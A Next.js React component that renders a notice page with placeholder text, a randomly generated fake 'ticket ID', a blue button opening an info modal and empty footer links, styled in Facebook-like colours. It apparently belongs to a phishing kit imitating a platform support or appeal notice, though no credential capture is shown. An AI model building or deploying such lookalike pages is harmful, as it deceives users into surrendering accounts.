'use client'
import { SITE_MAIN_MESSAGE } from '#data/site-message'
import Link from 'next/link'
import React from 'react'

const MainContent = ({
  handleOpendInfoModal,
}: {
  handleOpendInfoModal: () => void
}) => {
  const [ticketId, setTicketId] = React.useState('4564-ATFD-4865')

  const handleOpend = () => {
    handleOpendInfoModal()
  }

  React.useEffect(() => {
    const generateTicketId = () => {
      const section1 = Math.random().toString(36).substring(2, 6).toUpperCase()
      const section2 = Math.random().toString(36).substring(2, 6).toUpperCase()
      const section3 = Math.random().toString(36).substring(2, 6).toUpperCase()
      setTicketId(`${section1}-${section2}-${section3}`)
    }

    generateTicketId()
  }, [])

  return (
    <>
      <div className="flex flex-col items-center justify-start bg-[linear-gradient(130deg,rgba(249,241,249,1)_0%,rgba(234,243,253,1)_35%,rgba(237,251,242,1)_100%)] min-h-[100vh] w-full">
        <div className="max-w-[768px] w-full p-[15px] h-full">
          <div className="p-[15px]">
            <div className="flex items-start gap-[8px] flex-col justify-start mb-[30px]">
              <img
                src="images/icons/ic_blue.svg"
                className="w-[48px] h-[48px]"
                alt=""
              />
              <b className="text-[2rem]">{SITE_MAIN_MESSAGE}</b>
            </div>

            <div className="w-full">
              <div className="w-full mb-[20px]">
                <b className="text-[17px]">{SITE_MAIN_MESSAGE}</b>
                <p className="text-[15px] mb-[0px] mt-[15px]">
                  {SITE_MAIN_MESSAGE}
                </p>
                <p className="text-[15px] mb-[0px] mt-[15px]">
                  {SITE_MAIN_MESSAGE}
                </p>
                <p className="text-[16px] mb-[0px] mt-[14px] text-[#465a69]">
                  {SITE_MAIN_MESSAGE} — #{ticketId}
                </p>
              </div>

              <div className="w-full">
                <p className="mb-[15px]">
                  <b className="text-[17px] font-bold">{SITE_MAIN_MESSAGE}</b>
                </p>
                <p className="text-[15px] mb-[10px]">{SITE_MAIN_MESSAGE}</p>
                <p className="text-[15px] mb-[10px]">{SITE_MAIN_MESSAGE}</p>
                <p className="text-[15px] mb-[0px]">{SITE_MAIN_MESSAGE}</p>
              </div>
            </div>
          </div>
          <div
            className="bg-[#1877f2] text-white border-none rounded-full text-[16px] font-semibold px-[24px] py-[12px] cursor-pointer block w-full max-w-[300px] my-[20px] mx-auto text-center"
            onClick={handleOpend}
          >
            {SITE_MAIN_MESSAGE}
          </div>
          <div className="flex items-center text-center justify-center flex-wrap text-[12px] mt-[30px] text-[#65676b] gap-[16px]">
            <Link href="">{SITE_MAIN_MESSAGE}</Link>
            <Link href="">{SITE_MAIN_MESSAGE}</Link>
            <Link href="">{SITE_MAIN_MESSAGE}</Link>
            <Link href="">{SITE_MAIN_MESSAGE}</Link>
            <Link href="">
              {SITE_MAIN_MESSAGE} © {new Date().getFullYear()}
            </Link>
          </div>
        </div>
      </div>
    </>
  )
}

export default MainContent
